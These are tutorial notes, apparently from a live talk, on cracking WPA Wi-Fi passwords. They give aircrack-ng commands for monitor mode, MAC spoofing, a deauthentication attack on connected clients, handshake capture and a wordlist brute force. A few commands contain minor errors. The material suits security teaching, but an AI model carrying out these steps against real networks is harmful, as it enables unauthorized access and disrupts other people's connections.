Commands executed in live during P2P rump on cracking WPA handshakes using airmon-ng

 1-Set network interface to listen to the wireless traffic
    
    $sudo airmon-ng start wlan0

Your network interface doesn't have to be wlan0. It can be any wireless interface available on your system
It can also be an external wi-fi adapter preconfigured or to  be configure if you are using a virtual machine.
Using the airmon-ng script is the same thing that the following commands:
    
    $sudo ifconfig wlan0 down
    $iwconfig mode monitor 
    $macchanger -r wlan0     #add a layer of security for the user. 
                            #DO NOT PERFORM ATTACK ON UNAUTHORIZED NETWORKS
    $sudo ifconfig wlan0 up

 2-Monitoring traffic
 
    $sudo airodump-ng wlan0

When network is identified, get bssid (wireless network identification) and channel used
We can now filter our result

    $sudo airodump-ng -c <channel> -d <bssid> wlan0

3-Capture WPA hanshake 
Two steps are required
First we will start listening the traffic and specify that we want to save our results in a file
The file will be used to perform password bruteforce attack. It can also be analyzed using Wireshark

    $sudo airodump-ng -w <PATH/FILENAME> -c <channel> --d <bssid> wlan0

Second step is to start a desauthentification attack against a connected device to force deconnection
Once the deconnection is done, there will be a reconnection and so a new hanshake that will be captured by our previous command

    $sudo aireplay-ng --deauth 0 -a <bssid> wlan0

4-Set back interface and brute force password
When WPA handshake is captured your can turn back your wireless interface into manage mode
    $airmon-ng stop wlan0

Then brute force password using in our case rockyou.txt wordlist
    $aircrack-ng <PATH/FILENAME> -w /usr/share/wordlists/rockyou.txt

You can use hashcat to perform a faster brute force attack. It is up to you.
